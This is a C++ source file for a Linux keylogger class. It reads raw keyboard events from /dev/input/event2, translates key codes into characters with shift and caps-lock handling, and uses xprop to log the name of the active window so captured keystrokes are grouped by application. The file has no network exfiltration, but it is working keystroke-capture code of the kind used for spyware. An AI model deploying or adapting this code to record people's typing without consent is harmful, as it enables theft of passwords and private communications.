#define DEV_PATH "/dev/input/event2"
#include <vector>
#include "key_logger.h"
#include <iostream>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <errno.h>
#include <string.h>
#include <string>


//inclide chrono
 std::string CurrentDateTime() {
    std::string output = "Date:  ";
    time_t seconds = time(nullptr);
    tm* pTm = localtime(&seconds);
    return output + asctime(pTm);
    }
int check(int result) {
    if (result >= 0)
        return result;


    perror(strerror(errno));
    exit(-1);
}
inline std::string exec(const char* cmd) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "ERROR";
    char buffer[128];
    std::string result = "";
    while(!feof(pipe)) {
        if(fgets(buffer, 128, pipe) != NULL)
                result += buffer;
    }
    pclose(pipe);
    return result;
}
bool isLetter(const int value)
{
    if ((value >= 16 && value <= 25) || (value >= 30 && value <= 38) || (value >= 44 && value <= 50))
        return true;
    else
        return false;
}

#pragma region Класс кей логгера
Key_logger::Key_logger(){
        keys.insert({1,"ESC "});
        keys.insert({2,"1 "});
        keys.insert({3,"2 "});
        keys.insert({4,"3 "});
        keys.insert({5,"4 "});
        keys.insert({6,"5 "});
        keys.insert({7,"6 "});
        keys.insert({8,"7 "});
        keys.insert({9,"8 "});
        keys.insert({10,"9 "});
        keys.insert({11,"0 "});
        keys.insert({12,"- "});
        keys.insert({13,"= "});
        keys.insert({14,"BACKSPACE "});
        keys.insert({15,"TAB "});
        keys.insert({16,"q "});
        keys.insert({17,"w "});
        keys.insert({18,"e "});
        keys.insert({19,"r "});
        keys.insert({20,"t "});
        keys.insert({21,"y "});
        keys.insert({22,"u "});
        keys.insert({23,"i "});
        keys.insert({24,"o "});
        keys.insert({25,"p "});
        keys.insert({26,"[ "});
        keys.insert({27,"] "});
        keys.insert({28,"ENTER "});
        keys.insert({29, "CNTRL "});
        keys.insert({30,"a "});
        keys.insert({31,"s "});
        keys.insert({32, "d "});
        keys.insert({33, "f "});
        keys.insert({34, "g "});
        keys.insert({35,"h "});
        keys.insert({36,"j "});
        keys.insert({37,"k "});
        keys.insert({38, "l "});
        keys.insert({39,"; "});
        keys.insert({40,"\' "});
        keys.insert({41,"` "});
        keys.insert({42,"LSHIFT "});
        keys.insert({43,"\\ "}); 
        keys.insert({44,"z "});
        keys.insert({45,"x "});
        keys.insert({46,"c "});
        keys.insert({47,"v "});
        keys.insert({48,"b "});
        keys.insert({49,"n "});
        keys.insert({50,"m "});
        keys.insert({51,", "});
        keys.insert({52,". "});
        keys.insert({53,"/ "});
        keys.insert({54,"RSHIFT "});
        keys.insert({56, "LALT "});
        keys.insert({57,"SPACE "});
        keys.insert({58,"CAPSLOCK "});
        keys.insert({59,"f1 "});
        keys.insert({60,"f2 "});
        keys.insert({61,"f3 "});
        keys.insert({62,"f4 "});
        keys.insert({63,"f5 "});
        keys.insert({64,"f6 "});
        keys.insert({65,"f7 "});
        keys.insert({66,"f8 "});
        keys.insert({67,"f9 "});
        keys.insert({68,"f10 "});
        keys.insert({69,"NUMLOCK "});
        keys.insert({70,"SCROLLOCK "}); 
        keys.insert({100,"RALT "});
        keys.insert({103,"UP "});
        keys.insert({108,"DOWN "});
        keys.insert({105,"LEFT "});
        keys.insert({106,"RIGHT "});
        keys.insert({110,"INS "});
        keys.insert({111,"DEL "});
        keys.insert({119, "PAUSEBREAK"});
        keys.insert({125,"WIN "});

        keys.insert({1001,"ESC"});
        keys.insert({1002,"! "});
        keys.insert({1003,"@ "});
        keys.insert({1004,"# "});
        keys.insert({1005,"$ "});
        keys.insert({1006,"% "});
        keys.insert({1007,"^ "});
        keys.insert({1008,"& "});
        keys.insert({1009,"* "});
        keys.insert({1010,"( "});
        keys.insert({1011,") "});
        keys.insert({1012,"_ "});
        keys.insert({1013,"+ "});
        keys.insert({1016,"Q "});
        keys.insert({1017,"W "});
        keys.insert({1018,"E "});
        keys.insert({1019,"R "});
        keys.insert({1020,"T "});
        keys.insert({1021,"Y "});
        keys.insert({1022,"U "});
        keys.insert({1023,"I "});
        keys.insert({1024,"O "});
        keys.insert({1025,"P "});
        keys.insert({1026,"{ "});
        keys.insert({1027,"} "});

        keys.insert({1030,"A "});
        keys.insert({1031,"S "});
        keys.insert({1032, "D "});
        keys.insert({1033, "F "});
        keys.insert({1034, "G "});
        keys.insert({1035,"H "});
        keys.insert({1036,"J "});
        keys.insert({1037,"K "});
        keys.insert({1038, "L "});
        keys.insert({1039,": "});
        keys.insert({1040,"\" "});
        keys.insert({1041,"~ "});
        keys.insert({1042,"LSHIFT "});
        keys.insert({1043,"| "}); //!!
        keys.insert({1044,"Z "});
        keys.insert({1045,"X "});
        keys.insert({1046,"C "});
        keys.insert({1047,"V "});
        keys.insert({1048,"B "});
        keys.insert({1049,"N "});
        keys.insert({1050,"M "});
        keys.insert({1051,"< "});
        keys.insert({1052,"> "});
        keys.insert({1053,"? "});
        keys.insert({1058,"CAPSLOCK  "});
    }

  
   std::string  Key_logger::get_name_of_the_key(int key){
        return keys[key];
   } 
   std::vector<std::string> Key_logger::get_keys_vector(std::string path){
        std::vector<std::string> names;
        names.push_back(CurrentDateTime());
        int keys_fd; //дескриптор
        struct input_event t;  
        struct input_event t_shift;
        keys_fd = check(open(DEV_PATH, O_RDONLY));
        
        bool flag_shift = false;
        bool flag_caps = false;
        std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
        names.push_back(proc_name);
        while (true)
        {
            std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
            if (current_name != proc_name)
            {
                names.push_back("\n\n");
                names.push_back(current_name);
                proc_name = current_name;
            }
            if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
            {

                if (t.type == EV_KEY)

                    if (t.value == 0 || t.value == 1)
                    {
                        if (t.code == 42 && t.value == 1)
                            flag_shift = true;
                        if (t.code == 42 && t.value == 0)
                            flag_shift = false;
                        if (t.code == 58 && t.value == 1)
                        {
                            
                            flag_caps = !flag_caps;
                        }

                        if (t.value == 1 && isLetter(t.code))
                        {
                            if (flag_shift == true && flag_caps == false)
                            {
                                names.push_back(keys[t.code + 1000]);
                                std::cout << keys[t.code + 1000] << std::endl;
                            }
                            else if (flag_caps == true && flag_shift == false)
                            {
                                names.push_back(keys[t.code + 1000]);
                                std::cout << keys[t.code + 1000] << std::endl;
                            }
                            else
                            {
                                names.push_back(keys[t.code]);
                                std::cout << "key3 " << keys[t.code] << std::endl;
                            }
                        }               
                        else if (t.value == 1 && !isLetter(t.code))
                        {
                            if (flag_shift == true)
                            {
                                names.push_back(keys[t.code + 1000]);
                                std::cout  << keys[t.code + 1000] << std::endl;
                                if (t.code == 1)
                                    t.code += 1000;
                            }
                            if (flag_shift == false)
                            {
                                names.push_back(keys[t.code]);
                                std::cout  << keys[t.code] << std::endl;
                            }
                        }
                    }

                    if (t.code == 1001){
                        std::cout << t.code << std::endl;
                        std::cout << "Exit" << std::endl;
                        break;
                    }
                
            }


        }
        close(keys_fd);
        //names.push_back("\n"+ CurrentDateTime());
        return names;  
    }
#pragma endregion